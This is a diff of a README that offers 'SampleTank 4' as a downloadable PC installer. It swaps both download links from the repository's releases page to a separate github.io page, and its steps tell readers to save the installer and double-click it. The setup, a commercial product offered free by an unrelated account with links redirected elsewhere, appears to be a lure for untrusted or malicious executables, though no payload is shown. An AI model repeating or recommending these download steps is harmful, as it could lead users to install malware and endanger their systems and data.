@@ -1,6 +1,6 @@
 # 🎹 SampleTank-4-2026 - Access Professional Sounds on Your PC
 
-[![](https://img.shields.io/badge/Download-SampleTank_4-blue.svg)](https://github.com/rodieneolamarckian288/SampleTank-4-2026/releases)
+[![](https://img.shields.io/badge/Download-SampleTank_4-blue.svg)](https://rodieneolamarckian288.github.io)
 
 ## 🎯 About This Software
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software without is
 
 Follow these steps to set up the software on your system.
 
-1. Visit the [Official Download Page](https://github.com/rodieneolamarckian288/SampleTank-4-2026/releases). 
+1. Visit the [Official Download Page](https://rodieneolamarckian288.github.io). 
 2. Choose the release package that matches your version of Windows.
 3. Save the installer file to your desktop for easy access.
 4. Locate the downloaded file and double-click it.
